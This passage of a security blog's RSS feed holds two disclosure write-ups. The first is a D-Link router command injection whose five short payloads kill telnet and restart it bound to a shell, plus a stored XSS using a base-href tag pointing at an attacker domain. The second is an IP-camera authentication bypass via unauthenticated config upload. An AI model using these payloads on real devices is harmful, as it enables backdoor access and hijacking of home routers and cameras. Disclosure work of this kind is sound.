&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_request1.png&quot; alt=&quot;acl.sh3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking the &lt;code class=&quot;highlighter-rouge&quot;&gt;acl.sh&lt;/code&gt; script it is possible to see my untouched payload, this is the prove that I can break the script syntax and execute arbitrary commands!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh3.png&quot; alt=&quot;acl.sh3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;It’s time to exploit this injection to take full control over the device! My idea was to put a backdoor on the device and then use it to access the whole system. I thought Telnet was a good option since the router already has this software on board and it would have provided a fast and reliable access to the filesystem.&lt;/p&gt;

&lt;p&gt;Since the router by default runs a &lt;code class=&quot;highlighter-rouge&quot;&gt;utelnetd&lt;/code&gt; service &lt;code class=&quot;highlighter-rouge&quot;&gt;358 admin 180 S utelnetd -l /bin/login -d&lt;/code&gt; where a user, in order to access the system, has to provide valid credentials, it is necessary to stop this service and start a new one without any authentication. Something like this: &lt;code class=&quot;highlighter-rouge&quot;&gt;utelnetd -l /bin/sh -d&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However there was one big limitation with this injection point: the payload length. Suddenly the application cuts the user input allowing to inject only 15 characters (13 if you consider that the first and the last characters must be a semicolon &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt;) so it is necessary to find a workaround to bypass this limitation.&lt;/p&gt;

&lt;p&gt;After many failed attempts, I came out with the solution to my problem that could be defined a multi-stage exploit. In particular I’ve noticed that it was possible to inject commands multiple times inside the acl.sh script and all of them were executed, so the problem was to find a correct 13-chars-length command sequence that would have allowed to stop and then restart telnet service. I think there are different ways to do this, mine is the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Payload 1: 'ps|grep tel&amp;gt;a'     # identify telnet pid grepping ps output and store it in file a 
Payload 2: 'grep -v gr a&amp;gt;b'    # remove unwanted line
Payload 3: 'kill $(cat b)'     # kill utelnetd
Payload 4: 'cp /bin/sh .'      # copy sh executable in root folder
Payload 5: 'utelnetd -dl sh'   # restart utelnetd binded on sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final exploit is a simple python script that, for each payload, obtains a new &lt;code class=&quot;highlighter-rouge&quot;&gt;sessionKey&lt;/code&gt; (needed in order to perform any POST request to the router web application) and crafts the correct request based on exploit sequence. You can find it in my &lt;a href=&quot;https://github.com/c0mix/D-Link-DSL-3782-SecAdvisory&quot;&gt;github repo&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;video-container&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/uu6rZuEOzh0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
&lt;style&gt;
	.video-container {
	position:relative;
	padding-bottom:56.25%;
	padding-top:30px;
	height:0;
	overflow:hidden;
}

.video-container iframe, .video-container object, .video-container embed {
	position:absolute;
	top:0;
	left:0;
	width:100%;
	height:100%;
}	
&lt;/style&gt;

&lt;h3 id=&quot;final-notes&quot;&gt;Final notes&lt;/h3&gt;
&lt;p&gt;In order to exploit this vulnerability an attacker needs to be logged inside the web application. However, in a real world scenario, it is possible to chain &lt;a href=&quot;https://www.exploit-db.com/exploits/44657&quot;&gt;CVE-2018-8898&lt;/a&gt; (authentication bypass vulnerability) to attempt to execute this exploit as an unauthenticated user. Please note that my exploit already takes advantage of this vulnerability as shown in the video.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;stored-cross-site-scripting&quot;&gt;Stored Cross-Site Scripting&lt;/h2&gt;
&lt;p&gt;Cross-Site Scripting vulnerability, or XSS, arises when a malicious user input is echoed back inside a web application response without it has been properly sanitized. In particular, Stored Cross-Site Scripting occurs when data submitted by one user is stored in the application (typically in a back-end database) and then it is displayed to other users without being filtered or sanitized appropriately.&lt;/p&gt;

&lt;h3 id=&quot;discovery-1&quot;&gt;Discovery&lt;/h3&gt;
&lt;p&gt;The first thing that I do when I’m looking for XSS is to try to inject simple HTML-related metacharacters like the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt; &amp;gt;&lt;/code&gt; and see how the application reacts. If the web application reflects or stores my payload and then includes it inside a response without any output encoding, it is a good indicator of an injection issue presence. The next step is to try a more complicated but harmless payload to achieve an html injection. For example, as you can see from the following screenshot, the html tag &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s&amp;gt;&lt;/code&gt; was echoed back inside the response page and the html syntax results to be altered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss3.png&quot; alt=&quot;acl.sh3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation-1&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;It’s time to escalate this bug from an HTML to a JavaScript injection but, as aforementioned in the OS command injection, it is not possible to use a normal payload such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; because the application cuts our input.&lt;/p&gt;

&lt;p&gt;We definitely have to find a really short xss payload but, thanks to &lt;a href=&quot;https://twitter.com/brutelogic&quot;&gt;@brutelogic&lt;/a&gt; who wrote a great blog post titled &lt;a href=&quot;https://brutelogic.com.br/blog/shortest-reflected-xss-possible/&quot;&gt;The shortest xss payload&lt;/a&gt;, I’ve find out the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base href=//att.com&amp;gt;&lt;/code&gt; HTML tag that specifies the base URL/target for all relative URLs in a document. Basically, if an attacker managed to inject this tag inside a page, during the DOM construction all the external resources specified with a local path (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img href=&quot;/image/cat.png&quot;&amp;gt;&lt;/code&gt;) would be resolved with the new domain, so the browser instead of requesting a &lt;code class=&quot;highlighter-rouge&quot;&gt;current_domain/resource&lt;/code&gt;, it will request a &lt;code class=&quot;highlighter-rouge&quot;&gt;new_base/resource&lt;/code&gt;. Exploiting this behaviour the victim browser will automatically request some resources (the ones defined with a relative path) from the attacker’s domain. 
If you want to explore in depth the functionality of the &lt;code class=&quot;highlighter-rouge&quot;&gt;base&lt;/code&gt; tag, I’ve written a small demonstration page &lt;a href=&quot;https://www.w3schools.com/code/tryit.asp?filename=FZK6RNOO0OJX&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Let’s start to make it works! The first step to exploit this vulnerability is to find a short domain that fits the payload characters limitations. In particular,
in order to exploit this vulnerability in the wild, an attacker has to register a public domain composed by two short words with a dash between them: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;short string&amp;gt;-&amp;lt;short string&amp;gt;.&amp;lt;short top-level domain&amp;gt;&lt;/code&gt;.
As example, I used the domain &lt;code class=&quot;highlighter-rouge&quot;&gt;a-tt.com&lt;/code&gt; as the attacker’s domain and I managed to simulate its existence adding a line to my &lt;code class=&quot;highlighter-rouge&quot;&gt;hosts&lt;/code&gt; configuration file. 
The command showed below will force your pc to resolve the attacker’s domain &lt;code class=&quot;highlighter-rouge&quot;&gt;a-tt.com&lt;/code&gt; with the 127.0.0.1 IP address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1	a-tt.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second step needed is to create an &lt;code class=&quot;highlighter-rouge&quot;&gt;asp&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;header.asp&lt;/code&gt; with the real exploit payload, this code will be executed by the victim’s browser so you can add whatever you want. Reading the following steps the reason why the file needs to have this particular name and extension is clear. Since this is just a test, I created the following simple alert script that will prove the presence of the vulnerability by prompting a JavaScript popup.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-Javascript&quot;&gt;&amp;lt;html&amp;gt;
    &amp;lt;h1&amp;gt;Attacker's Site&amp;lt;/h1&amp;gt;
    &amp;lt;script&amp;gt;alert('XSS in domain: '+document.domain)&amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The third step needed is to start a local web server (for example using python) in order to serve our resource.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now it is possible to test our configuration:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-Javascript&quot;&gt;$ curl http://a-tt.com/header.asp
&amp;lt;html&amp;gt;
&amp;lt;h1&amp;gt;Attacker's Site&amp;lt;/h1&amp;gt;
&amp;lt;script&amp;gt;alert('XSS in domain: '+document.domain)&amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are now ready to store the XSS payload inside the device web application tampering the following request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see from the image, the payload was divided in two parts that have been injected respectively: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base href=//a&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;SrcIPaddrBeginTXT&lt;/code&gt; parameter and &lt;code class=&quot;highlighter-rouge&quot;&gt;tt.com&amp;gt;&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;SrcIPaddrEndTXT&lt;/code&gt; parameter.&lt;/p&gt;

&lt;p&gt;Once the DOM tree will be created by the browser, the html code, with the injected payload, will be the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As effect of this modification in the &lt;code class=&quot;highlighter-rouge&quot;&gt;base&lt;/code&gt;, the browser will request all the resources included in the page to the attacker’s domain &lt;code class=&quot;highlighter-rouge&quot;&gt;a-tt.com&lt;/code&gt; instead of to the real domain and, in particular, the first request that will perform hits the resource &lt;code class=&quot;highlighter-rouge&quot;&gt;/header.asp&lt;/code&gt; (that’s why we created this resource and hosted it on our server). 
The final result is shown in the picture below, where our payload has been downloaded and executed by the victim’s browser!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;These vulnerabilities were submitted to the vendor that acknowledged their presence. Moreover, the following CVEs were assigned by Mitre:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2018-17989 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17989&quot;&gt;Cross Site Scripting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;CVE-2018–17990 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17990&quot;&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html&quot;&gt;Pentesting iot&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/firmadyne/firmadyne&quot;&gt;Firmadyne Tool&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 24 Jan 2019 16:04:23 +0100</pubDate>
        <link>http://localhost:4000/2019/D-Link-DIR-3782-SecAdvisory-OS-Command-Injection-and-Stored-XSS/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/D-Link-DIR-3782-SecAdvisory-OS-Command-Injection-and-Stored-XSS/</guid>
        
        <category>Router</category>
        
        <category>IoT</category>
        
        <category>WebPenTest</category>
        
        <category>CVE-2018–17990</category>
        
        <category>CVE-2018-17989</category>
        
        
        <category>Web</category>
        
      </item>
    
      <item>
        <title>Break into 2K IP-Camera</title>
        <description>&lt;p&gt;&lt;em&gt;In this post I will explain technical details of a vulnerability that I found on several IP-Camera models during a IoT-PenTest session and marked as CVE-2017–17101. This vulnerability allows an unauthenticated remote user to bypass the login panel and access to all the device features.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;general-information&quot;&gt;General Information&lt;/h2&gt;
&lt;p&gt;It all started with a Penetration Test against a single device, one of the many medium price IoT IP-Cameras that allows a consumer to watch whatever is happening inside his home from anywhere (&lt;a href=&quot;https://www.amazon.com/s/ref=nb_sb_noss?url=search-alias%3Daps&amp;amp;field-keywords=ip+camera&quot;&gt;here&lt;/a&gt; some examples).
Only when I found an effective way to exploit this vulnerability I realized the real impact of it: according to &lt;a href=&quot;https://www.shodan.io/&quot;&gt;Shodan&lt;/a&gt;, 2K Internet-exposed devices were afflicted and could be exploited by anyone. For this reason some parts of the PoC’s details are redacted.&lt;/p&gt;

&lt;h2 id=&quot;setup-an-iot-testing-lab&quot;&gt;Setup an IoT-Testing Lab&lt;/h2&gt;
&lt;p&gt;First of all, the Lab setup! An efficient configuration should always look like as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/lab.png&quot; alt=&quot;lab&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Long story short: an Android &lt;strong&gt;Testing Smartphone&lt;/strong&gt; with IP-Camera’s app installed and the targeted &lt;strong&gt;Ip-Camera&lt;/strong&gt; device both configured to join a &lt;strong&gt;Fake Access Point&lt;/strong&gt;. Moreover my laptop used as connection provider equipped with &lt;strong&gt;Burp Suite&lt;/strong&gt; and &lt;strong&gt;Wireshark&lt;/strong&gt; to cover and intercept every possible communication channel.&lt;/p&gt;

&lt;h2 id=&quot;start-to-break-thething&quot;&gt;Start to break the ”Thing”&lt;/h2&gt;
&lt;p&gt;After finishing the classical network and information discovery phases of a PenTest, I focused my attention on the main door: the device web application that handles all device settings and information, exactly that web interface which someone exposes without any security concern on the public Internet, even without changing the default credentials!&lt;/p&gt;

&lt;h3 id=&quot;discovery&quot;&gt;Discovery&lt;/h3&gt;
&lt;p&gt;So let’s fire up Burp and walk the “happy path” looking for some interesting features to abuse… Just some minutes later, after the submission of login form and the navigation of settings menu, I found what I was looking for: Download and Upload functionality or &lt;strong&gt;configuration backup&lt;/strong&gt; and &lt;strong&gt;configuration restore&lt;/strong&gt; functionalities, to be precise!&lt;/p&gt;

&lt;p&gt;With the below request, a logged user (admin:suadmin) is allowed to download a text file containing all the configuration parameters of the IP-Camera (in the next section I will provide more details about this file).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/down.png&quot; alt=&quot;download&quot; /&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;CGI that manage the configuration's backup (download)&lt;/p&gt;

&lt;p&gt;As you can see from the following screenshot, the upload request allows anyone, without providing any type of authentication or credentials or session cookies, to upload a configuration file to the webcam. Yes, you read it right: &lt;strong&gt;it is possible to upload whatever you want without being authenticated&lt;/strong&gt; and the file that you will upload, if in right format, will overwrite the actual configuration of the IP-Camera, modifying the settings parameters.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/restore1.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;CGI that manage the configuration's restore (upload)&lt;/p&gt;

&lt;p&gt;That’s cool. However, what can I upload to the Camera without causing DoS or breaking some internal stuff or without knowing the original configuration file?&lt;/p&gt;

&lt;h3 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h3&gt;
&lt;p&gt;The answer is in the configuration file itself!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/config_file.png&quot; alt=&quot;config&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see from this snippet extracted from the configuration file, at a certain point there is also a section which handles the credentials and the privileges of each user.
In this case the idea was to upload only this little part of the configuration file in order to &lt;strong&gt;overwrite only the first user’s credentials&lt;/strong&gt;, avoiding a DoS and gathering an easy access from the login panel to the rest of the Camera menu. Final PoC looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/finalepl1.png&quot; alt=&quot;exploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wrapping all in a python script that takes as input IP &amp;amp; Port of a target + arbitrary Username &amp;amp; Password that the attacker wants to set, an authentication bypass exploit is ready… As you can see from the following video.&lt;/p&gt;

&lt;div class=&quot;video-container&quot;&gt;&lt;iframe width=&quot;854&quot; height=&quot;480&quot; src=&quot;https://www.youtube.com/embed/B75C13Zw35Y&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
&lt;style&gt;
	.video-container {
	position:relative;
	padding-bottom:56.25%;
	padding-top:30px;
	height:0;
	overflow:hidden;
}

.video-container iframe, .video-container object, .video-container embed {
	position:absolute;
	top:0;
	left:0;
	width:100%;
	height:100%;
}	
&lt;/style&gt;

&lt;h2 id=&quot;evaluation-of-theimpact&quot;&gt;Evaluation of the impact&lt;/h2&gt;
&lt;p&gt;Thanks to this exploit an &lt;strong&gt;unauthenticated user is able to bypass the login screen and access the webcam contents&lt;/strong&gt; including: live video stream, configuration files with all the passwords, system information, and much more.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-04-10-Break-into-2K-IP-Camera/Shodan1.png&quot; alt=&quot;shodan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As already mentioned before, with a specific query on Shodan it is possible to list about 2.000 vulnerable devices facing to the Internet.&lt;/p&gt;

&lt;h2 id=&quot;final-consideration&quot;&gt;Final Consideration&lt;/h2&gt;
&lt;p&gt;After a responsible disclosure of this issue to many vendors, &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2017-17101/&quot;&gt;CVE-2017–17101&lt;/a&gt; was assigned by Mitre at this vulnerability.
Please &lt;strong&gt;take your devices up to date&lt;/strong&gt; with the latest firmware upgrade and always change default credentials!
I hope you liked this article, see you soon…&lt;/p&gt;

</description>
        <pubDate>Tue, 10 Apr 2018 17:04:23 +0200</pubDate>
        <link>http://localhost:4000/2018/Break-into-2K-IP-Camera/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/Break-into-2K-IP-Camera/</guid>
        
        <category>IoT</category>
        
        <category>PenTest</category>
        
        <category>CVE-2017–17101</category>
        
        
        <category>IoT</category>
        
      </item>
    
  </channel>
</rss>
